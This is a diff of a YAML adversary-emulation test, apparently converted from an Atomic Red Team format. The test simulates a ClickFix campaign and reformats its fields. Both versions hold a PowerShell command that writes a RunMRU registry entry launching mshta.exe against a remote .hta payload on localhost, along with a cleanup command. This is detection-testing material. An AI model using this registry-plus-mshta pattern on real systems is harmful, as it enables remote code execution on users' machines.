@@ -1,4 +1,4 @@
-- id: 4d27fbd9-b4bd-55a3-828b-915664bdf5f4
+- requirements: []
   name: Soumaia ART Tests - ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell
   description: 'Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.
 
@@ -8,13 +8,15 @@
 
     Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection'
   tactic: execution
-  technique:
-    attack_id: T1204.002
-    name: 'User Execution: Malicious File'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
-        cleanup: |-
-          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
+  technique_id: T1204.002
+  technique_name: 'User Execution: Malicious File'
+  executors:
+  - cleanup:
+    - Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
+  id: 4d27fbd9-b4bd-55a3-828b-915664bdf5f4
